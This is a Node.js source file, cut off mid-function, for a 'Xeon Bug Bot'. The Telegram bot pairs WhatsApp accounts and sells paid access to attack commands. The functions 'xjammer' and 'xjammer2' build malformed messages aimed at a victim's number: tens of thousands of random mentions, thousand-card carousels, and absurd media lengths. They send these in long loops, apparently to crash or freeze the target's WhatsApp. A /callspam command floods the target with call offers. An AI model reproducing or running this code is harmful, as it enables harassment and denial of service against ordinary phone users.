//base by DGXeon (Xeon Bot Inc.)
//re-upload? recode? copy code? give credit ya :)
//YouTube: @DGXeon
//Instagram: unicorn_xeon13
//Telegram: @DGXeon13
//GitHub: @DGXeon13
//want more free bot scripts? subscribe to my youtube channel: https://youtube.com/@DGXeon
//telegram channel: https://t.me/xeonbotincorporated

const fs = require('fs');
const path = require('path');
const {
  default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  fetchLatestBaileysVersion,
  generateWAMessageFromContent,
  proto,
  relayMessage,
} = require('@whiskeysockets/baileys');
const P = require('pino');
const TelegramBot = require('node-telegram-bot-api');
const chalk = require('chalk');
const moment = require('moment-timezone');

// Import configuration
const CONFIG = require('./config');

// Database initialization
const db = {
  premiumUsers: loadJson('./database/premium.json'),
  OwnerUsers: loadJson('./database/Owner.json'),
  userNumbers: loadJson('./database/user_numbers.json'),
  botTokens: loadJson('./database/bot_tokens.json'),
};

// Session management
const sessions = new Map();
const whatsappStatusMap = new Map();
const rateLimits = new Map();
const RATE_LIMIT_WINDOW = 60 * 1000;
const MAX_COMMANDS_PER_WINDOW = 5;
const startTime = new Date();
const membershipCache = new Map();
const MEMBERSHIP_CACHE_TTL = 5 * 60 * 1000;

// Telegram bot initialization
const botInstances = new Map();
const bot = new TelegramBot(CONFIG.botToken, { polling: true });
botInstances.set('root', bot);

// Utility functions
function loadJson(file) {
  try {
    const rawData = fs.readFileSync(file, 'utf8') || '{}';
    const data = JSON.parse(rawData);
    if (file.includes('bot_tokens.json')) {
      if (Array.isArray(data)) {
        return data;
      } else if (typeof data === 'object' && data !== null) {
        const tokens = Object.values(data).filter(token => typeof token === 'string');
        console.log(`Converted object to array for bot_tokens.json: ${tokens.length} tokens found`);
        return tokens;
      }
      return [];
    }
    return data;
  } catch (err) {
    console.error(`Error loading ${file}: ${err.message}`);
    if (file.includes('bot_tokens.json')) {
      return [];
    }
    return {};
  }
}

function saveJson(file, data) {
  try {
    fs.writeFileSync(file, JSON.stringify(data, null, 2));
  } catch (err) {
    console.error(`Error saving ${file}:`, err.message);
  }
}

function sanitizePath(input) {
  return path.basename(input.replace(/[^0-9]/g, ''));
}

function isValidPhoneNumber(number) {
  const cleaned = number.replace(/[^0-9+]/g, '');
  const phoneRegex = /^\+\d{8,15}$/;
  return phoneRegex.test(cleaned);
}

function getUserBot(currentBot) {
  if (!currentBot) {
    console.warn('No currentBot provided, falling back to root bot');
  }
  return currentBot || botInstances.get('root');
}

async function checkMembership(chatId, senderId, isRootBot) {
  if (!isRootBot) {
    return { isMember: true };
  }

  if (CONFIG.owner.includes(senderId)) {
    return { isMember: true };
  }

  const userBot = getUserBot(botInstances.get('root'));
  console.log(`Checking membership for chat ${chatId} using bot ${await userBot.getMe().then(info => `@${info.username}`)}`);

  const cacheKey = `${senderId}:membership`;
  const cached = membershipCache.get(cacheKey);
  if (cached && Date.now() - cached.timestamp < MEMBERSHIP_CACHE_TTL) {
    console.log(`Using cached membership status for ${senderId}: ${cached.isMember}`);
    if (cached.isMember) {
      return { isMember: true };
    }
  }

  let retries = 2;
  while (retries > 0) {
    try {
      const channelStatus = await userBot.getChatMember(CONFIG.CHANNEL_ID, senderId);
      const groupStatus = await userBot.getChatMember(CONFIG.GROUP_ID, senderId);

      const isChannelMember = ['member', 'administrator', 'creator'].includes(channelStatus.status);
      const isGroupMember = ['member', 'administrator', 'creator'].includes(groupStatus.status);

      if (isChannelMember && isGroupMember) {
        membershipCache.set(cacheKey, { isMember: true, timestamp: Date.now() });
        return { isMember: true };
      }

      const missing = [];
      const buttons = [];
      if (!isChannelMember) {
        missing.push('channel');
        buttons.push([{ text: '📢 Join Channel', url: CONFIG.CHANNEL_INVITE_LINK }]);
      }
      if (!isGroupMember) {
        missing.push('group');
        buttons.push([{ text: '👥 Join Group', url: CONFIG.GROUP_LINK }]);
      }
      buttons.push([{ text: '📱 Follow WhatsApp', url: CONFIG.WHATSAPP_LINK }]);
      buttons.push([{ text: '🎥 Susbcribe YouTube', url: CONFIG.YOUTUBE_LINK }]);
      buttons.push([{ text: '📸 Follow Instagram', url: CONFIG.INSTAGRAM_LINK }]);
      buttons.push([{ text: '✅ Check Membership', callback_data: 'check_membership' }]);

      await userBot.sendMessage(chatId, `❌ You must join, subscribe and follow our whatsapp channel, instagram, youtube ${missing.join(' and ')} to use this bot. After doing so, click "Check Membership" or use /checkmembership.`, {
        reply_markup: {
          inline_keyboard: buttons,
        },
      });

      membershipCache.set(cacheKey, { isMember: false, timestamp: Date.now() });
      return { isMember: false };
    } catch (error) {
      console.error(`Error checking membership for ${senderId} (retry ${3 - retries}): ${error.message}`);
      retries--;
      if (retries === 0) {
        await userBot.sendMessage(chatId, `❌ Failed to verify membership due to an error. Please try /checkmembership later or contact @dgxeon13.`);
        membershipCache.set(cacheKey, { isMember: false, timestamp: Date.now() });
        return { isMember: false };
      }
      await sleep(1000);
    }
  }
}

function checkRateLimit(senderId, chatId) {
  const now = Date.now();
  let userLimit = rateLimits.get(senderId);
  if (!userLimit || now - userLimit.lastReset > RATE_LIMIT_WINDOW) {
    rateLimits.set(senderId, { count: 1, lastReset: now });
    return true;
  }
  if (userLimit.count >= MAX_COMMANDS_PER_WINDOW) {
    const userBot = getUserBot(botInstances.get('root'));
    userBot.sendMessage(chatId, `❌ Rate limit exceeded. Try again in ${Math.ceil((RATE_LIMIT_WINDOW - (now - userLimit.lastReset)) / 1000)} seconds.`);
    return false;
  }
  userLimit.count++;
  return true;
}

function getOnlineDuration() {
  const onlineDuration = new Date() - startTime;
  const seconds = Math.floor((onlineDuration / 1000) % 60);
  const minutes = Math.floor((onlineDuration / (1000 * 60)) % 60);
  const hours = Math.floor((onlineDuration / (1000 * 60 * 60)) % 24);
  return `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
}

async function deleteFolderRecursive(dir) {
  try {
    if (fs.existsSync(dir)) {
      fs.readdirSync(dir).forEach((file) => {
        const curPath = path.join(dir, file);
        if (fs.lstatSync(curPath).isDirectory()) {
          deleteFolderRecursive(curPath);
        } else {
          fs.unlinkSync(curPath);
        }
      });
      fs.rmdirSync(dir);
      console.log(`Deleted session folder: ${dir}`);
    }
  } catch (err) {
    console.error(`Error deleting folder ${dir}:`, err.message);
  }
}

function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

async function validateSession(userNumber, chatId, botInstance) {
  if (!sessions.has(userNumber) || !whatsappStatusMap.get(userNumber)) {
    const userBot = getUserBot(botInstance);
    await userBot.sendMessage(chatId, `❌ No active WhatsApp session for ${userNumber}. Please reconnect using /reqpair.`);
    // Clean up stale session data
    const chatIdForNumber = Object.keys(db.userNumbers).find((key) => db.userNumbers[key] === userNumber);
    if (chatIdForNumber) {
      delete db.userNumbers[chatIdForNumber];
      saveJson('./database/user_numbers.json', db.userNumbers);
    }
    sessions.delete(userNumber);
    whatsappStatusMap.delete(userNumber);
    return false;
  }
  return true;
}

// WhatsApp session management
async function startWhatsapp(number, botInstance) {
  const sessionDir = `./rent-session/${sanitizePath(number)}@s.whatsapp.net`;
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
  const sock = makeWASocket({
    auth: state,
    logger: P({ level: 'silent' }),
    printQRInTerminal: false,
  });

  sessions.set(number, sock);
  whatsappStatusMap.set(number, false);

  sock.ev.on('connection.update', async (update) => {
    const { connection, lastDisconnect } = update;
    const userBot = getUserBot(botInstance);
    if (connection === 'close') {
      const reason = lastDisconnect?.error?.output?.statusCode ?? lastDisconnect?.reason;
      console.log(`Disconnected for ${number}. Reason: ${reason}`);
      whatsappStatusMap.set(number, false);

      if (reason === DisconnectReason.connectionReplaced || reason === DisconnectReason.loggedOut) {
        await deleteFolderRecursive(sessionDir);
        const chatId = Object.keys(db.userNumbers).find((key) => db.userNumbers[key] === number);
        if (chatId) {
          delete db.userNumbers[chatId];
          saveJson('./database/user_numbers.json', db.userNumbers);
          await userBot.sendMessage(chatId, `Your WhatsApp session for ${number} has been ${reason === DisconnectReason.loggedOut ? 'logged out' : 'replaced'}. Please reconnect using /reqpair.`);
        }
        sessions.delete(number);
        whatsappStatusMap.delete(number);
      } else if (reason && (reason >= 500 || reason === 428 || reason === 408 || reason === 429)) {
        const chatId = Object.keys(db.userNumbers).find((key) => db.userNumbers[key] === number);
        if (chatId) {
          await getSessions(userBot, chatId, number);
        }
      } else {
        await deleteFolderRecursive(sessionDir);
        const chatId = Object.keys(db.userNumbers).find((key) => db.userNumbers[key] === number);
        if (chatId) {
          delete db.userNumbers[chatId];
          saveJson('./database/user_numbers.json', db.userNumbers);
          await userBot.sendMessage(chatId, `Your WhatsApp session for ${number} has been disconnected. Please reconnect using /reqpair.`);
        }
        sessions.delete(number);
        whatsappStatusMap.delete(number);
      }
    } else if (connection === 'open') {
      whatsappStatusMap.set(number, true);
      console.log(`Connected to WhatsApp for ${number}!`);
    }
  });

  sock.ev.on('creds.update', saveCreds);
  return sock;
}

async function getSessions(bot, chatId, number) {
  if (!bot || !chatId || !number) {
    console.error('Invalid inputs for getSessions');
    if (bot && chatId) {
      await bot.sendMessage(chatId, '❌ Internal error: Invalid parameters.');
    }
    return;
  }

  if (!/^\d{8,15}$/.test(number)) {
    await bot.sendMessage(chatId, `❌ Invalid number format: ${number}. Use digits only (8-15).`);
    return;
  }

  const sessionDir = `./rent-session/${sanitizePath(number)}@s.whatsapp.net`;
  try {
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const sock = makeWASocket({
      auth: state,
      logger: P({ level: 'silent' }),
      printQRInTerminal: false,
    });

    sessions.set(number, sock);
    whatsappStatusMap.set(number, false);

    sock.ev.on('connection.update', async (update) => {
      const { connection, lastDisconnect } = update;
      if (connection === 'close') {
        const reason = lastDisconnect?.error?.output?.statusCode || lastDisconnect?.reason;
        if (reason === DisconnectReason.connectionReplaced || reason === DisconnectReason.loggedOut) {
          whatsappStatusMap.set(number, false);
          await deleteFolderRecursive(sessionDir);
          delete db.userNumbers[chatId];
          saveJson('./database/user_numbers.json', db.userNumbers);
          await bot.sendMessage(chatId, `Your WhatsApp session for ${number} has been ${reason === DisconnectReason.loggedOut ? 'logged out' : 'replaced'}. Please reconnect using /reqpair.`);
          sessions.delete(number);
          whatsappStatusMap.delete(number);
        } else if (reason && reason >= 500 && reason < 600) {
          whatsappStatusMap.set(number, false);
          await bot.sendMessage(chatId, `Number ${number} disconnected from WhatsApp.`);
          await getSessions(bot, chatId, number);
        } else {
          whatsappStatusMap.set(number, false);
          await deleteFolderRecursive(sessionDir);
          delete db.userNumbers[chatId];
          saveJson('./database/user_numbers.json', db.userNumbers);
          await bot.sendMessage(chatId, `Number ${number} lost access. Please reconnect.`);
          sessions.delete(number);
          whatsappStatusMap.delete(number);
        }
      } else if (connection === 'open') {
        whatsappStatusMap.set(number, true);
        db.userNumbers[chatId] = number;
        saveJson('./database/user_numbers.json', db.userNumbers);
        await bot.sendMessage(chatId, `Number ${number} successfully connected.`);
      } else if (connection === 'connecting') {
        await new Promise((resolve) => setTimeout(resolve, 1000));
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const formattedNumber = number.replace(/\D/g, '');
          const pairingCode = await sock.requestPairingCode(formattedNumber, 'XEONKING');
          const formattedCode = pairingCode?.match(/.{1,4}/g)?.join('-') || pairingCode;
          await bot.sendMessage(chatId, `
┌──────┤ Pairing Code ├──────┐
│➻ Number: ${number}
│➻ Pairing Code: ${formattedCode}
└────────────────────────┘`);
        }
      }
    });

    sock.ev.on('creds.update', saveCreds);
  } catch (error) {
    console.error(`Error in getSessions for ${number}:`, error.message);
    await bot.sendMessage(chatId, `❌ Failed to initialize session for ${number}: Server error.`);
  }
}

async function xjammer(target, userNumber, chatId, botInstance) {
  // Validate session
  if (!(await validateSession(userNumber, chatId, botInstance))) {
    throw new Error('No active WhatsApp session');
  }

  if (!target.endsWith('@s.whatsapp.net') || target.includes('@g.us')) {
    throw new Error('Invalid target JID. Only individual WhatsApp numbers are supported.');
  }

  const generateRandomJids = (maxSize) => {
    const jids = [];
    let currentSize = 0;
    while (currentSize < maxSize - 25) {
      const randomNumber = Math.floor(Math.random() * 1e10).toString().padStart(10, '0');
      const jid = `91${randomNumber}@s.whatsapp.net`;
      jids.push(jid);
      currentSize += jid.length + 3;
    }
    return jids;
  };

  const maxSize = 1074689;
  const jids = generateRandomJids(maxSize);

  try {
    const userSock = sessions.get(userNumber);

    for (let i = 0; i < 1000; i++) {
      // Recheck session before each send
      if (!(await validateSession(userNumber, chatId, botInstance))) {
        throw new Error('No active WhatsApp session');
      }

      await sleep(3000);
      let tmsg = await generateWAMessageFromContent(target, {
        extendedTextMessage: {
          text: "",
          contextInfo: {
            stanzaId: userSock.generateMessageTag(),
            participant: "0@s.whatsapp.net",
            remoteJid: "dgxeon@eu",
            mentionedJid: jids,
            fromMe: false,
            isForwarded: true,
            forwardingScore: 999,
            businessMessageForwardInfo: {
              businessOwnerJid: target,
            },
          },
        },
      }, {});

      await userSock.relayMessage("status@broadcast", tmsg.message, {
        messageId: tmsg.key.id,
        statusJidList: [target],
        additionalNodes: [{
          tag: "meta",
          attrs: {},
          content: [{
            tag: "mentioned_users",
            attrs: {},
            content: [{
              tag: "to",
              attrs: { jid: target },
              content: undefined,
            }],
          }],
        }],
      });

      let push = [];
      for (let i = 0; i < 1000; i++) {
        push.push({
          body: proto.Message.InteractiveMessage.Body.fromObject({
            text: ``,
          }),
          footer: proto.Message.InteractiveMessage.Footer.fromObject({
            text: "",
          }),
          header: proto.Message.InteractiveMessage.Header.fromObject({
            title: '',
            hasMediaAttachment: true,
            imageMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/34764738_320019993959203_5174575234777775036_n.enc?ccb=11-4&oh=01_AdQVCKhvkaeb2GrB6guuwFGNLlZ7KJCiy6p4AtJKwUNmjg&oe=65536880&_nc_sid=000000&mms3=true",
              mimetype: "image/jpeg",
              fileSha256: "tcHyO7wrPPNctPRoi7x669hT8YEM0oB4Av25pSeG1cQ=",
              fileLength: "73384124",
              height: 1,
              width: 1,
              mediaKey: "/WtTeZEAvMxYIHa4hIrcGExALsiU3CKLMT3lqwNd8yk=",
              fileEncSha256: "BgKFWKbH4aeiME5GrSg/sinfE8Z96dX7Utm1OjmEXXM=",
              directPath: "/v/t62.7118-24/34764738_320019993959203_5174575234777775036_n.enc?ccb=11-4&oh=01_AdQVCKhvkaeb2GrB6guuwFGNLlZ7KJCiy6p4AtJKwUNmjg&oe=65536880&_nc_sid=000000&_nc_hot=1697385259",
              mediaKeyTimestamp: "1697384837",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIABkAGQMBIgACEQEDEQH/xAAvAAACAwEAAAAAAAAAAAAAAAAAAgEDBQQBAQEBAQEAAAAAAAAAAAAAAAABAgME/9oADAMBAAIQAxAAAADtfj6vRxsmprJBpaZueqDoJeLqz+/JmUWBpRXSJbDjDjsxjOtxsdzTMHqivfx1NoxgzxoyVbCKdDlhrXtw2zdsyxWqDvyrA4ogFaQhALf/xAAkEAACAgICAQQDAQAAAAAAAAAAAQIRAxIEMSEQExRRIzJCof/aAAgBAQABPwArUs0Reol+C4keR5tR1NH1b//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQIBAT8AH//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8AH//Z",
            },
          }),
        });
      }

      tmsg = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2,
            },
            interactiveMessage: proto.Message.InteractiveMessage.fromObject({
              body: proto.Message.InteractiveMessage.Body.create({
                text: '\0',
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
                text: '\n'.repeat(99),
              }),
              header: proto.Message.InteractiveMessage.Header.create({
                hasMediaAttachment: false,
              }),
              carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                cards: [...push],
              }),
            }),
          },
        },
      }, {});

      await userSock.relayMessage("status@broadcast", tmsg.message, {
        messageId: tmsg.key.id,
        statusJidList: [target],
        additionalNodes: [{
          tag: "meta",
          attrs: {},
          content: [{
            tag: "mentioned_users",
            attrs: {},
            content: [{
              tag: "to",
              attrs: { jid: target },
              content: undefined,
            }],
          }],
        }],
      });
    }
  } catch (error) {
    console.error(`Error in xjammer for ${userNumber}:`, error.message);
    throw error; // Throw error to stop the loop in the caller
  }
}

async function xjammer2(target, userNumber, chatId, botInstance, mention = true) {
  // Validate session
  if (!(await validateSession(userNumber, chatId, botInstance))) {
    throw new Error('No active WhatsApp session');
  }

  if (!target.endsWith('@s.whatsapp.net') || target.includes('@g.us')) {
    throw new Error('Invalid target JID. Only individual WhatsApp numbers are supported.');
  }

  const floods = 40000;
  const mentioning = "13135550002@s.whatsapp.net";
  const mentionedJids = [
    mentioning,
    ...Array.from({ length: floods }, () =>
      `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
    )
  ];

  const links = "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true";
  const mime = "audio/mpeg";
  const sha = "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=";
  const enc = "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=";
  const key = "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=";
  const timestamp = 99999999999999;
  const path = "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0";
 

  const longs = 99999999999999;
  const loaded = 99999999999999;
  const data = "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg==";

  const messageContext = {
    mentionedJid: mentionedJids,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363321780343299@newsletter",
      serverMessageId: 1,
      newsletterName: "𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂�82𐍉�82"
    }
  };

  const messageContent = {
    ephemeralMessage: {
      message: {
        audioMessage: {
          url: links,
          mimetype: mime,
          fileSha256: sha,
          fileLength: longs,
          seconds: loaded,
          ptt: true,
          mediaKey: key,
          fileEncSha256: enc,
          directPath: path,
          mediaKeyTimestamp: timestamp,
          contextInfo: messageContext,
          waveform: data
        }
      }
    }
  };

  try {
    const userSock = sessions.get(userNumber);

    const msg = await generateWAMessageFromContent(target, messageContent, { userJid: target });

    const broadcastSend = {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: target }, content: undefined }
              ]
            }
          ]
        }
      ]
    };

    await userSock.relayMessage("status@broadcast", msg.message, broadcastSend);

    if (mention) {
      await userSock.relayMessage(target, {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25
            }
          }
        }
      }, {
        additionalNodes: [{
          tag: "meta",
          attrs: {
            is_status_mention: " Telegram: @dgxeon13 "
          },
          content: undefined
        }]
      });
    }
  } catch (error) {
    console.error(`Error in xjammer2 for ${userNumber}:`, error.message);
    throw error; // Throw error to stop the loop in the caller
  }
}

async function sendMessagesForDuration(durationHours, target, userNumber, chatId, botInstance) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let count = 0;

  const userBot = getUserBot(botInstance);

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs) {
      console.log('Delivery completed within specified duration.');
      await userBot.sendMessage(chatId, `✅ Delivery completed to ${target.replace('@s.whatsapp.net', '')}.`);
      return;
    }

    if (count < 800) {
      // Recheck session before each send
      if (!(await validateSession(userNumber, chatId, botInstance))) {
        return;
      }
      await xjammer2(target, userNumber, chatId, botInstance, true);
      count++;
      await new Promise((resolve) => setTimeout(resolve, 1000));
      await sendNext();
    } else {
      console.log(chalk.green(`Completed sending ${count} messages to ${target}`));
      count = 0;
      console.log(chalk.yellow('Pausing before next batch...'));
      await new Promise((resolve) => setTimeout(resolve, 5000));
      await sendNext();
    }
  };

  await sendNext();
}

async function sendMessagesForDurationX(durationHours, target, userNumber, chatId, botInstance) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let count = 0;

  const userBot = getUserBot(botInstance);

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs) {
      console.log('Delivery completed within specified duration.');
      await userBot.sendMessage(chatId, `✅ Delivery completed to ${target.replace('@s.whatsapp.net', '')}.`);
      return;
    }

    if (count < 800) {
      // Recheck session before each send
      if (!(await validateSession(userNumber, chatId, botInstance))) {
        return;
      }
      await xjammer(target, userNumber, chatId, botInstance);
      count++;
      await new Promise((resolve) => setTimeout(resolve, 1000));
      await sendNext();
    } else {
      console.log(chalk.green(`Completed sending ${count} messages to ${target}`));
      count = 0;
      console.log(chalk.yellow('Pausing before next batch...'));
      await new Promise((resolve) => setTimeout(resolve, 5000));
      await sendNext();
    }
  };

  await sendNext();
}

function registerCommandHandlers(botInstance, isRootBot = false) {
  botInstance.onText(/\/start|menu(?:\s(.+))?/, async (msg) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    if (msg.chat.type !== 'private') return;

    const membership = await checkMembership(chatId, senderId, isRootBot);
    if (!membership.isMember) return;

    const userBot = getUserBot(botInstance);
    const senderName = msg.from.username ? `@${msg.from.username}` : `${senderId}`;
    const isPremium = db.premiumUsers.includes(senderId);

    const caption = `
┌──────┤ Xeon Bug Bot ├──────┐
│➻ Name: ${senderName}
│➻ Developer: @dgxeon13
│➻ Status: ${isPremium ? 'Premium' : 'No Access'}
│➻ Online: ${getOnlineDuration()}
└──────────────────────┘
┌──────┤ Press Button Menu ├──────┐
└────────────────────────┘`;

    await userBot.sendPhoto(chatId, 'https://i.ibb.co/4ng6VsgM/Picsart-25-06-01-01-02-32-207.jpg', {
      caption,
      reply_markup: {
        inline_keyboard: [
          [
            { text: '〢Bug Menu', callback_data: 'bugmenu' },
            { text: '〢Misc Menu', callback_data: 'miscmenu' },
          ],
          [{ text: '〢Channel', url: CONFIG.CHANNEL_INVITE_LINK }],
          [{ text: '〢Group', url: CONFIG.GROUP_LINK }],
        ],
      },
    });
  });

  botInstance.onText(/\/reqpair(?:\s(.+))?/, async (msg, match) => {
    const senderId = msg.from.id;
    const chatId = msg.chat.id;

    if (msg.chat.type !== 'private') return;

    const membership = await checkMembership(chatId, senderId, isRootBot);
    if (!membership.isMember) return;

    const userBot = getUserBot(botInstance);

    if (!checkRateLimit(senderId, chatId)) return;
    if (!db.premiumUsers.includes(senderId)) {
      return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: @DGXeon13

💰 Price/Harga:
✅ Access permanent: 15$
✅ Resell permanent: 25$
✅ Script no enc 100%: 100$`);
    }

    if (!match[1]) {
      return userBot.sendMessage(chatId, '❌ Provide a phone number.\nExample: /reqpair +919876543210');
    }

    const rawNumber = match[1].trim();
    if (!isValidPhoneNumber(rawNumber)) {
      return userBot.sendMessage(chatId, '❌ Invalid phone number. Use international format (e.g., +919876543210).');
    }

    const numberTarget = rawNumber.replace(/[^0-9+]/g, '').replace(/^\+/, '');
    if (numberTarget.includes('@g.us')) {
      return userBot.sendMessage(chatId, '❌ Group chats are not supported.');
    }

    try {
      await getSessions(userBot, chatId, numberTarget);
    } catch (error) {
      console.error(`Error in /reqpair for ${senderId}: ${error.message}`);
      await userBot.sendMessage(chatId, '❌ Failed to process /reqpair: Server error.');
    }
  });

  botInstance.onText(/\/delpair(?:\s(.+))?/, async (msg, match) => {
    const senderId = msg.from.id;
    const chatId = msg.chat.id;

    if (msg.chat.type !== 'private') return;

    const membership = await checkMembership(chatId, senderId, isRootBot);
    if (!membership.isMember) return;

    const userBot = getUserBot(botInstance);

    if (!checkRateLimit(senderId, chatId)) return;
    if (!db.premiumUsers.includes(senderId)) {
      return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: @DGXeon13

💰 Price/Harga:
✅ Access permanent: 15$
✅ Resell permanent: 25$
✅ Script no enc 100%: 100$`);
    }

    if (!match[1]) {
      return userBot.sendMessage(chatId, '❌ Provide a phone number.\nExample: /delpair +919876543210');
    }

    const rawNumber = match[1].trim();
    if (!isValidPhoneNumber(rawNumber)) {
      return userBot.sendMessage(chatId, '❌ Invalid phone number. Use international format (e.g., +919876543210).');
    }

    const numberTarget = rawNumber.replace(/[^0-9+]/g, '').replace(/^\+/, '');

    try {
      const sessionDir = `./rent-session/${sanitizePath(numberTarget)}@s.whatsapp.net`;
      const chatIdForNumber = Object.keys(db.userNumbers).find((key) => db.userNumbers[key] === numberTarget);

      if (!chatIdForNumber || !sessions.has(numberTarget)) {
        return userBot.sendMessage(chatId, `❌ No active session found for ${numberTarget}.`);
      }

      const sock = sessions.get(numberTarget);
      if (sock) {
        await sock.logout();
      }

      await deleteFolderRecursive(sessionDir);
      delete db.userNumbers[chatIdForNumber];
      saveJson('./database/user_numbers.json', db.userNumbers);
      sessions.delete(numberTarget);
      whatsappStatusMap.delete(numberTarget);

      await userBot.sendMessage(chatId, `✅ WhatsApp session for ${numberTarget} has been deleted and disconnected.`);
    } catch (error) {
      console.error(`Error in /delpair for ${numberTarget}: ${error.message}`);
      await userBot.sendMessage(chatId, `❌ Failed to delete session for ${numberTarget}: ${error.message}`);
    }
  });
  
  // Register the /callspam command
botInstance.onText(/\/xxcallspam(?:\s(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /callspam raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return;
  }

  if (!db.premiumUsers.includes(senderId)) {
    return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: @DGXeon13

💰 Price/Harga:
✅ Access permanent: 15$
✅ Resell permanent: 25$
✅ Script no enc 100%: 100$`);
  }

  console.log(`[DEBUG] /callspam input: match[1] = "${match[1]}"`);

  if (!match[1] || match[1].trim() === '') {
    console.log(`[DEBUG] /callspam: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a target number.\nExample: /callspam +919876543210');
  }

  const rawTarget = match[1].trim();
  console.log(`[DEBUG] /callspam: rawTarget = "${rawTarget}"`);

  if (!isValidPhoneNumber(rawTarget)) {
    console.log(`[DEBUG] /callspam: Invalid phone number format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid target number. Use international format (e.g., +919876543210).');
  }

  const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');
  console.log(`[DEBUG] /callspam: numberTarget = "${numberTarget}"`);

  if (numberTarget.length < 8 || numberTarget.length > 15) {
    console.log(`[DEBUG] /callspam: Invalid number length for "${numberTarget}" (length: ${numberTarget.length})`);
    return userBot.sendMessage(chatId, `❌ Invalid target number length (${numberTarget.length} digits). Must be 8-15 digits.`);
  }

  if (numberTarget === userNumber) {
    return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
  }

  // Block specific numbers
  const blockedNumbers = ['916909137213', '919366316018', '919402104401'];
  if (blockedNumbers.includes(numberTarget)) {
    return userBot.sendMessage(chatId, '❌ This number is blocked from being targeted.');
  }

  const formattedNumber = `${numberTarget}@s.whatsapp.net`;

  // Verify if the target number is registered on WhatsApp
  const userSock = sessions.get(userNumber);
  try {
    const contactInfo = await userSock.onWhatsApp(formattedNumber);
    if (contactInfo.length === 0) {
      return userBot.sendMessage(chatId, '❌ The number is not registered on WhatsApp.');
    }
  } catch (error) {
    console.error(`Error checking WhatsApp registration for ${numberTarget}: ${error.message}`);
    return userBot.sendMessage(chatId, `❌ Error verifying number: ${error.message}`);
  }

  try {
    await userBot.sendPhoto(chatId, 'https://i.ibb.co/4ng6VsgM/Picsart-25-06-01-01-02-32-207.jpg', {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│ Sending call spam...
│ Target: ${numberTarget}
│ From: ${userNumber}
└────────────────────────┘`,
    });

    await userBot.sendMessage(chatId, `✅ Successfully started call spam to @${numberTarget} using /callspam. Pause for 2 minutes to avoid bans.`, {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [[{ text: 'Contact Support', url: 'https://t.me/dgxeon13' }]],
      },
    });

    await sleep(1000);

    // Send 30 call offers with a 2-second delay between each
    for (let i = 0; i < 30; i++) {
      if (!(await validateSession(userNumber, chatId, botInstance))) {
        return;
      }
      const success = await sendOfferCall(userSock, formattedNumber);
      if (!success) {
